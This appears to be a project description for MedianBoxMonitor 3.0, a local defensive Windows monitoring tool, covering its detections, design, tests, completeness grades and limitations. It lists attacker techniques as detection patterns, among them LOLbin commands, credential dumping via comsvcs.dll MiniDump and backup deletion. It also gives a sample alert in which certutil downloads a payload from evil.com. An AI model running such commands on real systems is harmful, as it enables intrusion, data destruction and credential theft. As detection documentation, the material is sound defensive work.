# About MedianBoxMonitor 3.0

## The Problem

Modern computers are under constant threat. Hackers use fileless malware, living-off-the-land binaries (LOLbins), process hollowing, encoded PowerShell, macro malware, browser exploits, credential dumping, lateral movement, and stealthy persistence mechanisms that traditional antivirus cannot detect because they use legitimate system tools and techniques.

A connected hacker — someone who has gained remote access to your machine — does not need to drop a file. They can run `certutil.exe` to download a payload, use `rundll32.exe` to execute it from memory, create a WMI subscription for persistence, dump LSASS credentials with `comsvcs.dll,MiniDump`, and exfiltrate data through a Discord webhook — all using tools that ship with Windows.

Meanwhile, your VPN might be leaking DNS queries, your browser might be exposing your real IP via WebRTC, and a compromised service might be beaconing to a command-and-control server every 30 seconds — and you would never know.

## The Solution

MedianBoxMonitor 3.0 is a **local, defensive security monitoring application** that sits inside your operating system and watches everything in real time. It does not scan the network. It does not attack remote users. It observes what is happening on your own machine and reasons about whether those actions are legitimate or malicious.

### Design Philosophy

**Deductive, not heuristic.** Every alert (called a "deduction") comes with a full evidence chain — not just "suspicious" but exactly why, with the process name, PID, parent process, command line, destination IP, domain, country, and the specific rule that triggered. You can audit every alert and verify whether it is a true or false positive.

**Defense in depth.** The monitor does not rely on a single detection method. It cross-references process behavior, network connections, DNS queries, GeoIP data, registry changes, file system changes, DLL loads, memory forensics, Windows event logs, and 18 anti-hack heuristics. A hacker who evades one detection will be caught by another.

**No single source is trusted.** The MultiVerifier cross-checks IP geolocation using 11 core independent methods plus ~230 named wire-evidence checks (244 named methods today). If one source says "United States" and another says "Russia," that disagreement is itself reported as a VPN/proxy indicator. Confidence grades (A through F) tell you exactly how much to trust each verdict.

**Local only.** The monitor runs entirely on your machine. It does not phone home. It does not upload your data. GeoIP lookups go to public APIs (ip-api.com, ipwho.is) for IP enrichment only — your personal data stays local.

**Works without packet capture.** If Npcap/WinPcap is not installed, the monitor continues operating on process and connection data from psutil. Packet capture enhances detection but is not required. The monitor never silently stops collecting data.

**Fails visibly.** Exceptions in the process watcher, connection inventory, and GUI refresh are logged, not silently swallowed. The status line updates every 5 seconds — if it stops, something is wrong and you will see it.

## What It Catches

### Connected Hackers

- **Network-spawned shells** — sshd.exe, w3wp.exe, or termsrv.exe spawning cmd.exe or powershell.exe (post-exploitation indicator #1)
- **Listening port anomalies** — non-system process opening unexpected ports (bind shell, C2 listener)
- **Credential dumping** — mimikatz, procdump -ma, reg save HKLM\SAM, ntdsutil, comsvcs.dll MiniDump
- **Process hollowing** — svchost.exe running from C:\Temp\ instead of System32
- **Parent-child mismatch** — svchost.exe spawned by cmd.exe instead of services.exe
- **LOLbin abuse** — certutil -urlcache, bitsadmin /transfer, mshta http://, regsvr32 /i:http (Squiblydoo), rundll32 from temp
- **PowerShell obfuscation** — encoded commands, download cradles, AMSI bypass, Reflection.Assembly, stealth flag combos
- **Macro malware** — Word/Excel/PowerPoint spawning cmd.exe or powershell.exe
- **Browser exploits** — Chrome/Firefox/Edge spawning shells or mshta.exe
- **Renamed system binaries** — cmd.exe or powershell.exe running from Downloads or Temp
- **Port forwarding** — chisel, ngrok, ligolo, plink, SSH -L/-R/-D
- **Data staging** — 7z/winrar/tar compressing user document directories before exfiltration
- **Backup tampering** — vssadmin delete shadows, wbadmin delete catalog, bcdedit recoveryenabled no (ransomware indicator)
- **Admin share access** — net use \\host\C$, PsExec (lateral movement)
- **Exfil channels** — connections to Discord webhooks, Telegram bot API, Pastebin, webhook.site
- **Exfil uploads** — curl/wget with --upload-file or -T flags to external servers

### System Compromise

- **Windows Security events** — logon (4624/4625), process creation (4688), service install (7045), user creation (4720), admin group changes (4728/4732), Kerberos tickets (4768/4769)
- **Hosts file hijack** — modification to C:\Windows\System32\drivers\etc\hosts
- **DNS server changes** — DNS resolver addresses changed via netsh or DHCP
- **New services** — services with binary paths in Temp/Downloads/AppData (persistence/backdoor)
- **Defender disable** — real-time protection turned off, firewall disabled
- **New user accounts** — new users or admin group members (backdoor accounts)
- **WMI persistence** — WMI event filter or CommandLineEventConsumer creation (APT persistence)
- **Driver loads** — new kernel drivers or .sys files (rootkit indicator)
- **Malware mutexes** — known mutex names from Cobalt Strike, Meterpreter, and other malware families

### Network Threats

- **C2 beaconing** — regular-interval connections to the same destination
- **DNS tunneling** — high-entropy subdomains, long labels, high query rates (data exfiltration via DNS)
- **Exfiltration** — I/O byte spike exceeding 10x baseline
- **Phantom connections** — ESTABLISHED connections with no owning process
- **Injection chains** — known app (Chrome, Word) spawning unknown children with many connections
- **Mimicry** — process connecting to IPs that impersonate a known legitimate service
- **Foreign connections** — process connecting to an unexpected country
- **High-risk countries** — connections to CN, RU, KP, IR (configurable)
- **DoH bypass** — DNS-over-HTTPS connections that bypass local DNS monitoring
- **Inbound port scans** — external IPs probing multiple ports
- **TLS MITM** — certificate anomalies indicating man-in-the-middle
- **Tor exit nodes** — TorDNSEL/exit-list check flags endpoints that are Tor exits (`is_tor` on every connection)
- **Flow probe** — momentary local-firewall block/unblock on demand (right-click an IP → ⚗ Flow probe): a flow that returns on a new exit IP in the same provider is proven VPN rotation (ROTATED/STICKY/GONE verdicts)
- **Wire-evasion family** — packet-path deductions with no process owner: ARP spoof pairs (ARP-poison MITM), gratuitous-ARP storms, rogue DHCP and rogue router advertisements, LLMNR spoofing, MAC-address rotation, martian/bogon traffic, 802.1Q-in-Q double tags, TTL injection, and persistent non-IP ethertype channels
- **VPN gateway mode** — detects when this machine is forwarding traffic for downstream tunnel clients (or is itself a tunnel client) and meters inner flows separately

### VPN/Privacy Leaks

- **DNS resolver leaks** — DNS queries going outside the VPN tunnel
- **IPv6 leaks** — global IPv6 traffic bypassing an IPv4-only VPN
- **Route leaks** — traffic not routing through the VPN interface
- **WebRTC leaks** — browser exposing real local IP via WebRTC
- **Proxy detection** — TCP fingerprinting, known proxy port patterns

### Behavioral Anomalies

- **Idle anomaly** — network activity while the user is idle (5+ minutes)
- **ML anomaly** — statistical Z-score deviation over a 24-hour baseline window
- **Behavioral anomaly** — process behavior deviating from its own established baseline
- **DLL injection** — suspicious modules loaded into process memory
- **Registry persistence** — Run keys, scheduled tasks, startup folder changes
- **Clipboard access** — processes reading the clipboard
- **USB device changes** — new USB devices connected or removed
- **File system changes** — modifications to sensitive directories

### Signals Beyond IP (Spectrum & RF Intelligence)

Connections are not only IP sockets. Any device that emits a signal the host can hear is traced as a first-class emitter:

- **Wi-Fi emitters** — every AP/BSSID beacon the WLAN adapter hears (via `netsh wlan`), with SSID, RSSI, band, channel, radio type, authentication, and an estimated distance from the path-loss model; the host's own radio state (connected SSID/BSSID, link rates, signal %) is itself a tracked emitter
- **Bluetooth & BLE** — the local radio, paired/PnP-enumerated devices, and (with the optional `bleak` library) live BLE adverts
- **WWAN/cellular** — mobile-broadband interfaces via `netsh mbn`
- **Wi-Fi Direct / P2P** — virtual direct adapters on the interface census
- **Layer-2 wire talkers** — with packet capture active, every source MAC on the wire becomes an `l2-wire` emitter labeled with the ethertypes it speaks, the IPs it claims, the discovery services it announces (mDNS, SSDP, LLMNR, WS-Discovery, DHCP, NetBIOS, IPv6-ND), and derived roles — router, DHCP server, discovery-announcer, `never-speaks-ip`, `raw-ethertype-channel`
- **RF hardware** — USB devices that unlock more spectrum: SDR receivers/transceivers (RTL-SDR, HackRF, Airspy, ADALM-PLUTO, LimeSDR, SDRplay), Zigbee/802.15.4 sniffers (CC2531, ConBee), Z-Wave sticks, NFC/RFID readers, Ubertooth, Flipper Zero, and proprietary 2.4 GHz receivers (Logitech Unifying, Razer, PixArt)

Every emitter shares one registry across **11 media** — first/last seen, active/lost lifecycle, observation counts, per-sensor attribution, RSSI history, approach/recession trend, and approximate distance. When 3+ cooperating sensors report the same emitter (via `rf_sensors` config or the `rf_obs_file` drop), a weighted-least-squares **trilaterator** produces a lat/lon fix with an RMS error and an honest quality grade. Deductions fire for hidden-SSID beacons (classic rogue-AP cover), evil-twin suspects (same SSID on a new BSSID), approaching emitters, and newly detected RF hardware. A 12-row **spectrum coverage matrix** states plainly which media this host can hear — Zigbee, Z-Wave, NFC, sub-GHz bands show as unavailable without the matching receiver. Nothing is fabricated.

Emitters with any position evidence are also drawn on the IP map: trilaterated fixes render as solid dots with RMS-error circles, single-receiver RSSI emitters render as dashed range rings (the tooltip is explicit that bearing is not measurable with one antenna), and un-ranged local talkers cluster around the receiver marker — a "PINPOINTS & GEO LOCATIONS" sidebar lists every mapped point (local marker, connection dots, trace hops, sensors, emitters) with multi-select and a full-record detail pane.

## How It Was Built

The program is a single Python file (~45,400 lines) with 62 top-level classes organized into functional layers:

1. **Data classes** — `ProcessProfile`, `Deduction`, `ConnectionEntry` (dataclasses)
2. **Detection classes** — `DNSTunnelingDetector`, `BeaconDetector`, `EntropyAnalyzer`, `ProcessLegitimacyChecker`, `DLLInspector`, `InboundScanDetector`, `DoHDetector`, `TLSCertDetector`
3. **Monitor classes** — `RegistryMonitor`, `ClipboardMonitor`, `USBMonitor`, `ScheduledTaskMonitor`, `NamedPipeMonitor`, `FileSystemWatchdog`, `SecurityEventMonitor`, `HostsFileMonitor`, `ServiceMonitor`, `SecurityToolMonitor`, `UserAccountMonitor`, `WMISubscriptionMonitor`, `DriverLoadMonitor`, `MutexScanner`
4. **Enrichment classes** — `DNSCache`, `GeoIPCache`, `ServiceResolver`, `ConnectionInventory`, `ConnectionHistory`, `WhoisLookup`, `VirusTotalChecker`
5. **Verification classes** — `LocationVerifier`, `MultiVerifier`, `ProxyDetector`, `VPNLeakDetector`
6. **Signal/spectrum classes** — `SpectrumHub`, `SignalRegistry`, `Trilaterator`, `WiFiSpectrumScanner`, `BluetoothRFScanner`, `WWANScanner`, `InterfaceCensus`, `RFHardwareDetector` (plus the packet-path L2 wire census feeding `l2-wire` emitters)
7. **Infrastructure classes** — `PacketPipeline`, `TokenBucket`, `DatabaseManager`, `SIEMOutput`, `AlertEscalation`, `StatisticalBaseline`, `JA4Plus`
8. **GUI classes** — `GNATracerGUI`, `TileManager`, `WidgetTooltip`
9. **Main class** — `MedianBoxMonitor` (orchestrates all threads, detections, and data flow)

The program uses threading extensively (~20 persistent daemon threads plus worker pools) with careful lock management. The connection mapper replaces data structures atomically rather than mutating them, allowing the process watcher to grab references without copying. Background workers handle slow network I/O (GeoIP API calls, reverse DNS) so the main scanning loops never block.

Performance is engineered, not assumed — a versioned snapshot + render pipeline measured under cProfile on a ~400-process / ~300-connection / 20k-timeline load: every store carries a mutation counter, `_get_full_data` caches each section and rebuilds only on real change (21.4 → ~0.14 ms steady state), `_get_dashboard_state` memoizes process rows on `_proc_seq` (11.1 → ~0.02 ms), each GUI tab keeps a render signature so text is rewritten only when its feed moved (~4.7 → ~0.59 ms per 250 ms tick, ~73 → ~13 Tcl calls), and the Live tab renders 250 expanded rows in ~34 ms (was ~2,540 ms) via clickable text spans and `_BufferedText` batch insertion instead of per-row `tk.Button` widgets.

## Testing

Fifteen test/verification scripts plus two static field-visibility audits — over 1,900 assertions in total. Detection-logic suites ask "does the detection logic fire correctly?"; delivery-layer suites ask the equally important "does what it produces actually reach the user?" A correct detection that never renders is as useless as an incorrect one.

- **`_test_antihack.py`** (41 tests) — Simulates sneaky hacker techniques (LOLbin abuse, PowerShell obfuscation, macro malware, process hollowing, credential dumping, etc.) and verifies each detection path fires correctly, including negative tests that verify benign activity does not trigger false positives.
- **`_test_vpn_leak.py`** (~30 tests) — Tests VPN leak detection for DNS, IPv6, route, and WebRTC leaks.
- **`_test_vpn_detection.py`** — Tests VPN/proxy detection false-positive rate (target: <5%, achieved: 0%) across 1,100 synthetic endpoints.
- **`_test_location_accuracy.py`** — Tests MultiVerifier location accuracy against live GeoIP lookups.
- **`_test_gatecrasher.py`** (68 checks) — IKE, PROX, TLSALT, BANNER, IPID, SRVLOC and VPN-gateway detection, plus the round-2 methods GEOFEED, RPKI, TSRTT, H2FP, RDRCT — synthetic packets and loopback listeners, no external targets.
- **`_test_wireproof.py`** (1,560 checks) — The silent-tunnel / non-IP-channel suite: every passive wire-evidence row (WireGuard, OpenVPN, DTLS, L3 tunnels, ICMP tunnels, QUIC, ECH, WS tunnels, one-way channels, and dozens of protocol self-ID decoders) fed to the pure classifiers and `verify()`.
- **`_test_data_wiring.py`** — Runs the real monitor against live traffic and asserts every field a collector harvests actually lands on the connection record for every public IP, that the process export isn't silently truncated, and that no payload key is built and never read.
- **`_test_gui_render.py`** — Drives the actual Tkinter widgets (not a mock) through all 18 tabs against live data and asserts zero exceptions, zero stale `?` placeholders, and that every newly-wired field is present in the rendered text.
- **`_test_ui_smoke.py`** (~180 checks) — Full GUI smoke pass: every tab renders, sensor chips count correctly, search bars filter, the inspector dossier expands, and the Signals tab shows emitters/coverage/trilateration with detailed field labels.
- **`_test_click_actions.py`** (~10 checks) — Fires real `<Button-1>` events at the clickable connection rows and block/unblock controls — verifying the performance rework (embedded `tk.Button` widgets replaced with tagged text spans) didn't silently break interactivity.
- **`_test_map_declutter.py`** / **`_test_map_default_view.py`** — Endpoint-map declustering and default-viewport behavior.
- **`_test_perf_profile.py`** — cProfile harness (~400 processes, ~300 connections, 20k timeline rows) used to drive the versioned-cache render pipeline.
- **`_test_ui_shot.py`** / **`_test_ui_shot_sys.py`** — Render the real GUI and screenshot each tab for visual review.
- **`_audit_fields.py`** / **`_audit_ui.py`** — Static audits that answer "is anything collected but never displayed?" — every event-field key a feed produces must have a render path, and every wire/protocol field name must reach the UI.

## Feature Completeness Ratings

Every subsystem below was audited against the actual source (not the docs) on 2026-08-22 and re-verified 2026-11-08 (figures and feature set refreshed; structural grades unchanged). Grades reflect what the code does *today*, not what it's designed to eventually do. Scale:

| Grade | Meaning |
|-------|---------|
| **A** | Fully implemented, cross-platform where relevant, verified against live data |
| **B** | Fully implemented on the primary platform (Windows), solid, but static rule lists or single-platform only |
| **C** | Implemented with a real structural limitation (opt-in, rate-capped, static thresholds, degrades without an optional dependency) |
| **D** | Present but materially incomplete — covers a minority of what the name implies |
| **F** | Not implemented |

| Subsystem | Grade | Why |
|-----------|-------|-----|
| Spectrum/RF & L2 signal intelligence | **B** | Real cross-medium emitter registry (Wi-Fi/BLE/WWAN/interfaces/RF-hardware/L2 wire talkers), RSSI distance + trend, WLS trilateration with honest quality grades, evil-twin and hidden-SSID deductions — but bounded by what the host can physically hear: Zigbee/Z-Wave/NFC/sub-GHz need external SDR/dongle hardware, live BLE adverts need the optional `bleak` library, and the L2 census needs packet capture (Npcap+admin). Coverage matrix reports hardware gaps honestly instead of fabricating data. |
| Network & connection tracking | **A-** | Every public endpoint now gets full GeoIP + VPN/proxy cross-verification (fixed 2026-08-22 — previously only ~15% of connections qualified). Interface auto-detection now correctly picks the live adapter (was picking a disconnected APIPA link in testing). |
| VPN/proxy detection | **A-** | 100% detection / 0% false-positive rate against a 1,100-endpoint synthetic test set. Runs on every public IP, not a filtered subset. |
| GeoIP & MultiVerifier | **B+** | Excellent cross-verification design (11 core methods + 244 named evidence checks, honest confidence grading) — but defaults to free third-party HTTP APIs (ip-api.com, ipwho.is) with no local MaxMind DB bundled, and every enriched IP leaves the machine over plain HTTP unless you supply your own DB. |
| Core deductions (16) + anti-hack process checks (18) | **B** | Solid, auditable evidence chains. All are heuristic — path, parent, command-line keyword, and static threat lists. No code-signing check anywhere in the codebase. |
| Anti-hack background monitors (8) | **C** | Fully functional, but **100% Windows-only** — every one shells out to a Windows-specific tool (`sc`, `wmic`, `schtasks`, `net user`, `netsh`, `wevtutil`) or WinAPI. On Linux/macOS these 8 monitors, plus the 9 Windows-only process checks that depend on them, simply never fire. |
| Packet analysis / JA4+ / SNI | **C+** | Well-built, but entirely inert without Npcap/WinPcap installed — and it is **not installed by default nor auto-checked at startup with a clear remediation prompt**, so a user can run the tool for weeks unaware that packet-level detection is silently disabled. |
| Malware signature / static detection | **F** | Zero code-signing (Authenticode) verification and zero YARA/byte-signature scanning exist anywhere. A binary correctly named, correctly parented, and correctly pathed is invisible to every check regardless of whether it's actually signed by the vendor it impersonates. |
| Automated response | **F** | The only containment action is a manual "Block IP" button (Windows Firewall rule). There is no automatic process termination, quarantine, or network isolation on a CRITICAL finding — a user away from the screen gets no containment at all. |
| Out-of-band alerting | **F** | SIEM output (JSON/CEF file or syslog) is the only notification path. No email, Slack/Discord webhook, push, or SMS — a CRITICAL deduction fired while you're not looking at the GUI or dashboard produces no alert anywhere else. |
| Persistent storage | **D** | The SQLite database has exactly 2 tables (`deductions`, `devices`). Connections, processes, VPN-leak events, the RF emitter registry, and all ~18 extended-monitor event feeds (filesystem, clipboard, USB, scheduled tasks, named pipes, inbound scans, DoH, TLS certs, Bluetooth, serial, spectrum, security events, hosts file, services, security tools, user accounts, WMI, drivers, mutexes) are **not** in the database — only in rotating text logs and 10-minute session snapshots. There is no SQL-queryable connection or process history. |
| Threat intelligence freshness | **D** | LOLbin patterns, the 25 exfil-channel domains, the 10 malware mutex names, VPN/proxy ASN markers, and high-risk country codes are all hardcoded Python constants. No feed integration, no auto-update — the list is exactly as current as the last time someone edited the source. |
| Packaging / reproducibility | **D** | No `requirements.txt`, `pyproject.toml`, or pinned dependency versions anywhere in the project. Provisioning a clean environment means reading imports and guessing versions. |
| Cross-platform coverage overall | **D** | Despite "Linux (partial)" in the docs, in practice Linux gets process/connection/DNS/GeoIP/VPN-detection only — roughly 24 of the ~33 named detections (everything touching the registry, WMI, services, scheduled tasks, the security event log, or Windows-only WinAPI) simply don't run. macOS has no dedicated support at all beyond a single `open` command to launch a folder in Finder. |

## Limitations

**Detection boundaries**
- **Encrypted payload content is invisible by design.** The monitor sees TLS metadata (SNI, JA3/JA4, certificate fields) but never decrypts application data. Malicious activity conducted entirely inside a TLS session with a benign-looking SNI (e.g., abuse of a compromised legitimate SaaS token) is outside what packet inspection here can ever see — this is a correct privacy boundary, not a bug, but it means the tool cannot be the only layer of defense.
- **No code-signing (Authenticode) or YARA/signature scanning exists.** Every detection is behavioral or heuristic — path, parent process, command-line keywords, static mutex names, port patterns. A binary that is correctly named, correctly pathed, and correctly parented is invisible to every check, whether or not it is actually signed by the vendor it claims to be.
- **Mutex detection uses a static list of 10 known names** (Cobalt Strike, Meterpreter, and a handful of others). Any malware author who renames their mutex — a one-line change — evades this check entirely. There is no generic/heuristic mutex-anomaly detection.
- **DNS-tunneling and entropy thresholds are fixed constants**, not adaptive per-network baselines. A slow, low-and-slow tunnel that stays under the entropy/rate threshold evades detection; conversely, legitimately high-entropy traffic can trip a warning that requires manual review.
- **No sandboxing or dynamic detonation.** This is a passive observer of what actually runs. A payload that waits for a specific trigger and never manifests suspicious behavior while being watched will not be caught.
- **Heuristics are not proof.** Every deduction is an evidence chain, not a verdict. A `LISTEN_ANOMALY` on `ollama.exe` or `python.exe` is a flag for review, not a confirmed compromise. The user is the final arbiter.

**Platform & dependency boundaries**
- **Packet capture requires Npcap/WinPcap** on Windows, and the monitor does not check for it at startup with an actionable prompt — it silently falls back to psutil-only operation. Without it, the monitor cannot extract SNI, DNS queries, or TLS fingerprints from raw packets, and beacon/entropy/JA4 detection has nothing to analyze.
- **8 of the anti-hack background monitors, and most of the 9 core process checks that depend on Windows-specific data, only run on Windows.** Linux gets process, connection, DNS, GeoIP, and VPN/proxy detection — a real and useful subset, but not the "18 anti-hack features" headline in full. macOS is essentially unsupported.
- **Windows Security event log requires admin** to read the Security channel. Without admin, the `wevtutil` fallback is used but may have limited results.
- **VirusTotal integration is opt-in via an environment variable** (`VT_API_KEY`) with no CLI flag or GUI field to set it, and the free-tier API is rate-limited to 4 requests/minute — far below the process-creation rate of an active machine, so even configured, only a small fraction of executables ever get checked.
- **GeoIP accuracy depends on the data source.** ip-api.com and ipwho.is are free APIs with reasonable accuracy but are not authoritative, and a local MaxMind database is optional and not bundled — you must supply your own. The MultiVerifier surfaces disagreements precisely because no single source should be trusted.

**Signal/spectrum boundaries**
- **The monitor traces only emitters the host can physically observe.** "Every device that sends a signal" means every signal this machine's radios and interfaces can actually receive — Wi-Fi beacons in range, BLE adverts in range, local interfaces, wire frames. Bands with no local receiver (Zigbee, Z-Wave, NFC, sub-GHz ISM, cellular uplink details) are invisible without matching SDR/dongle hardware, and the coverage matrix says so rather than guessing.
- **RSSI-derived distance is an estimate**, not a measurement — the log-distance model carries ±tens-of-meters error indoors. Precise positioning needs 3+ cooperating sensors at known coordinates (`rf_sensors` or the `rf_obs_file` drop); the trilaterator refuses to fabricate a fix from insufficient geometry and reports `coarse`/`degenerate` grades honestly.
- **Wi-Fi scanning is `netsh`-dependent and Windows-only**; live BLE advert capture needs the optional `bleak` package; wideband spectrum sweeps need external SDR utilities (`rtl_power`, `hackrf_sweep`, `SoapySDRUtil`, …) which are auto-detected and listed, never bundled.
- **The L2 wire census requires packet capture** — without Npcap + admin there are no frames to census, so the `l2-wire` medium simply reports no talkers.
- **External services can fail.** ip-api.com, ipwho.is, rdap.org, and VirusTotal can be rate-limited, unreachable, or return incomplete data. The monitor degrades gracefully — unresolved entries show as "Unknown" and are re-queued for later enrichment.

**Response & operational boundaries**
- **The monitor is defensive only** and does not identify remote VPN users, attack remote systems, or perform any offensive operations. It watches your own machine.
- **The only containment action is a manual firewall-rule block per IP.** There is no automatic process kill, quarantine, or network isolation on a CRITICAL finding.
- **No out-of-band alerting exists** beyond SIEM file/syslog output. If you are not looking at the GUI or web dashboard when a CRITICAL fires, nothing pages you.
- **The Tkinter GUI has no authentication of its own** — only the optional web dashboard supports a password. Anyone with desktop access while the GUI is open sees the full forensic picture.
- **Only 2 of the tracked entity types are in the SQLite database** (deductions, devices). Connections, processes, and every Tier-5 monitor event live only in rotating text logs and periodic session snapshots — there is no SQL-queryable history for them.

## How Evidence Works

Every deduction is a `Deduction` dataclass with:

- **category** — one of 40+ named categories (MIMIC, FOREIGN, BEACON, LOLBIN_ABUSE, etc.)
- **severity** — CRITICAL or WARNING
- **process_name** and **pid** — the offending process
- **message** — human-readable summary
- **evidence** — a list of strings, each one a specific fact that contributed to the deduction
- **score** — numeric risk score (0-100+, compounded by `AlertEscalation` when the same process triggers multiple deductions within 5 minutes)

For example, a `LOLBIN_ABUSE` deduction might have evidence like:

```
["Process: certutil.exe (PID 4892)",
 "Command: certutil -urlcache -split -f http://evil.com/payload.exe C:\\Temp\\run.exe",
 "Matched pattern: -urlcache",
 "Matched pattern: -split",
 "Matched pattern: http"]
```

This is auditable. You can see exactly what the process was doing and why the monitor flagged it. You can verify whether it was a legitimate admin task or an attack.

## The Anti-Hack Pin System

When an anti-hack check fires, the finding is "pinned" to the remote IP addresses owned by the offending process. This connects the local detection to the network endpoint:

- `_pin_to_conns(pid, category, detail)` — finds all remote IPs for the PID and adds the category to `_anti_hack_pins[ip]`
- `_anti_hack_pins` — dict mapping `ip → set(categories)`
- `_anti_hack_details` — dict mapping `ip → list(detail_strings)`

Pins are rendered in the Overview tab, Live Connections tab, All Connections tab, and per-connection detail views. They are also exported in the **Sneakiest Connections** section of save files.

## Auto-Flag Action System

Beyond the 16 core deductions and 18 anti-hack checks, every process action is screened against 33 suspicious keyword patterns. This catches activity that does not match a specific deduction rule but still warrants attention:

- `cookie` → COOKIE_TRACKING
- `upload`/`exfil` → DATA_UPLOAD / DATA_EXFIL
- `credential`/`password`/`token` → CREDENTIAL_ACCESS / TOKEN_ACCESS
- `clipboard` → CLIPBOARD_ACCESS
- `keylog` → KEYLOGGER
- `screenshot` → SCREEN_CAPTURE
- `inject`/`hook` → CODE_INJECTION / API_HOOK
- `encrypt`/`decrypt` → ENCRYPTION (possible ransomware)
- `powershell`/`cmd.exe`/`wscript`/`cscript` → SCRIPT_EXEC
- `rdp`/`vnc`/`ssh`/`telnet` → REMOTE_ACCESS
- `microphone`/`camera`/`webcam`/`audiodg` → HARDWARE_ACCESS
- `temp\`/`appdata`/`downloads\` → TEMP_EXECUTION / SUSPICIOUS_PATH

These appear in the Suspicious Activity tab and the save file's Suspicious Activity section.

## Known Service Validation

The monitor includes CIDR ranges for known services (Google, Cloudflare, Microsoft, Discord, Zoom, Riot Games) and expected executable paths for 20+ system and application processes. This allows it to:

- Validate that a `chrome.exe` connection to a Google IP range is legitimate
- Flag a `chrome.exe` connection to an unknown IP as suspicious
- Detect a `svchost.exe` running from `C:\Temp\` as process hollowing
- Detect a `svchost.exe` spawned by `cmd.exe` as parent spoofing

## Scope

This program is for **local defensive security monitoring**. It helps you:

- Detect if a hacker has gained access to your machine
- Detect if malware is running, even fileless malware using LOLbins
- Detect if your VPN is leaking your real IP or DNS queries
- Detect if a process is beaconing to a C2 server
- Detect if someone is dumping credentials or moving laterally
- Detect if persistence mechanisms have been installed
- Record everything in time-segmented files for forensic analysis — organized `sessions/YYYY-MM-DD/` logs plus a dedicated `Desktop/GNAT/YYYY-MM-DD/` record folder with a `RECORD MANIFEST` section and a `latest_snapshot.json` machine-readable twin of the full session payload

It is not for de-anonymizing remote VPN users, attacking remote systems, or replacing your antivirus. It is a witness that watches your own machine and tells you what it sees.
